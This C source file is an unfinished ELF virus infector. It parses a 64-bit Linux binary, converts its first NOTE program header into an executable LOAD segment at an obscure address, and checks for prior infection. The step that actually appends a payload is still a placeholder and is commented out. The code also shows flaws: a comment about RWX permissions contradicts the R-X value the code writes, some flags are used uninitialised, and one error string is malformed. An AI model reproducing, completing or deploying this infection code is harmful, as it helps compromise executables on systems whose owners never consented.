#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <getopt.h>
#include "./vrn_elf.h"
#include "./elf_funcs.h"

#define EHDR_SIZE 64
unsigned long long VADDR = 0xc0c0c0c0;

/*
  The Juice.
  This function *should* only be called once, even if there
  are multiple NOTE headers.

  This converts the NOTE to a LOAD, gives it RWX perms, and
  sets its virtual address to someplace we hopefully won't have
  any code, so we can jump to it without disrupting any other
  part of the binary.

  change it to avoid standing out.
*/
void note_to_load(FILE *fp, Elf64_Phdr *new_load, Elf64_Addr file_offset, Elf64_Addr memory_offset, Elf64_Xword infect_len) {
  unsigned int type = 1;
  unsigned int perms = 5; 

  // This is hackey, but... it works (?)
  // TODO: find a way to store addresses of the file to structs so we don't have to use seeks to edit binary
  fseek(fp, -56, SEEK_CUR);
  fwrite(&type,          sizeof(type),          1, fp); // Change type to LOAD
  fwrite(&perms,         sizeof(perms),         1, fp); // Set PERMS to R-X (5)
  fwrite(&file_offset,   sizeof(file_offset),   1, fp); // Move the offset to the very end of file
  fwrite(&memory_offset, sizeof(memory_offset), 1, fp); // Throw our payload somewhere obscure
  fwrite(&infect_len,    sizeof(infect_len),    1, fp); // Set the memsz to our infection length
  fwrite(&infect_len,    sizeof(infect_len),    1, fp); // Set the filesz to our infection length too
  fseek(fp, -40, SEEK_CUR); // We leave the allign field alone and rewind back to start of header

  parse_program_header(fp, new_load); // Throw the new values into the new_load struct
}

/*
  Infects the ELF file.
*/
void infect_elf(FILE *fp) {
  Elf64_Ehdr *ehdr;
  ehdr = malloc(sizeof(*ehdr));

  int note_count = 0;

  // Calculate variables we need
  fseek(fp, 0L, SEEK_END);
  Elf64_Addr file_offset = ftell(fp);
  rewind(fp);
  Elf64_Addr memory_offset = VADDR + file_offset;
  Elf64_Xword infect_len = 0x41414141; // Temp value while we run tests
  

  parse_elf_header(fp, ehdr);

  unsigned short phdr_count = ehdr->e_phnum;
  Elf64_Phdr *phdr = malloc(phdr_count * sizeof(*phdr));
  Elf64_Phdr *new_load = malloc(sizeof(*new_load));;

  for (int i = 0; i < phdr_count; i++) {
    parse_program_header(fp, &phdr[i]);

    /*
      To avoid breaking the binary, we have to add a ridiculous check
      to confirm we haven't tainted this binary before.

      This check is problematic since the VADDR isn't guaranteed to *never*
      appear in a legit binary, but it's worked up til now, so /shrug
    */
    if (phdr[i].p_type == 1 && phdr[i].p_vaddr == memory_offset) {
      log_msg("Found LOAD with our virtual offset...");
      print_program_header(&phdr[i]);
      exit_on_error(fp, "Either we have already infected this binary or this is a scary coincidence...");
    }

    /*
      If we get here and we enter this if statement, we can pretty much
      guarantee we have no NOTE_TO_LOAD conversions yet.
    */
    if (phdr[i].p_type == 4 && note_count == 0) {
      log_msg("Found NOTE!");
      note_count++;
      note_to_load(fp, new_load, file_offset, memory_offset, infect_len);
      log_msg("Converted NOTE:");
      print_program_header(&phdr[i]);
      log_msg("To LOAD:");
      print_program_header(new_load);
      log_msg("Attempting to infect now...");
      //infect_the_bloody_elf();
    }
  }

  free(ehdr);
  free(phdr);
  free(new_load);

  return;
}

/*
  Parses the ELF we ingested from the command line.
*/
void parse_elf(FILE *fp) {
  Elf64_Ehdr *ehdr;
  ehdr = malloc(sizeof(*ehdr));

  parse_elf_header(fp, ehdr); // Parse ELF header

  unsigned short phdr_count = ehdr->e_phnum;
  Elf64_Phdr *phdr = malloc(phdr_count * sizeof(*phdr));

  // Parse Program headers
  for (int i = 0; i < phdr_count; i++) {
    parse_program_header(fp, &phdr[i]);
  }

  log_msg("ELF Header");
  print_elf_header(ehdr);
  log_msg("Program Headers");
  for (int i = 0; i < phdr_count; i++) {
    print_program_header(&phdr[i]);
  }

  free(ehdr);
  free(phdr);

  return;
}

int main(int argc, char *argv[]) {
  if (argc < 2) {
    usage(argv[0]);
    exit(1);
  }

  // long opt examples taken from the man page of getopt
  int c;
  int reg_arg, parse_flag, infect_flag = 0;
  char *elf_file;
  while (1) {
    int option_index = 0;
    static struct option long_options[] =
    {
      {"parse",  no_argument,       NULL, 0},
      {"infect", no_argument,       NULL, 0},
      {NULL,     0,                 NULL, 0}
    };

    c = getopt_long(argc, argv, "-:pi", long_options, &option_index);
    if (c == -1) break;

    switch(c) {
      case 0:
        printf("long option %s\n", long_options[option_index].name);
        if (optarg) {
          printf(" with arg %s\n", optarg);
        }
        break;
      case 1:
        reg_arg = 1;
        elf_file = optarg;
        break;
      case 'p':
        parse_flag = 1;
        break;
      case 'i':
        infect_flag = 1;
        break;
      case '?':
        usage(argv[0]);
        break;
      default:
        usage(argv[0]);
    }
  }
  if (!reg_arg) {
    usage(argv[0]);
  }

  struct stat stats;
  FILE *fp;
  
  if (stat(elf_file, &stats) == 0) {
    log_msg("Opened file. Parsing ELF...");
  } else {
    log_err("File not found.");
  }

  if (!check_modes(stats)) {
    log_err("File must be readable, writeable, and executable. Exiting...");
  }

  // Open file as byte readable
  fp = fopen(elf_file, "r+b");
  if (fp == NULL) {
    char *fp_err = "Could not open file: %s", elf_file;
    exit_on_error(fp, fp_err);
  }

  if (parse_flag || !infect_flag) {
    rewind(fp);
    parse_elf(fp);
  }
  if (infect_flag) {
    rewind(fp);
    infect_elf(fp);
  }

  fclose(fp);
  log_msg("Closing target and exiting...");
  return 0;
}
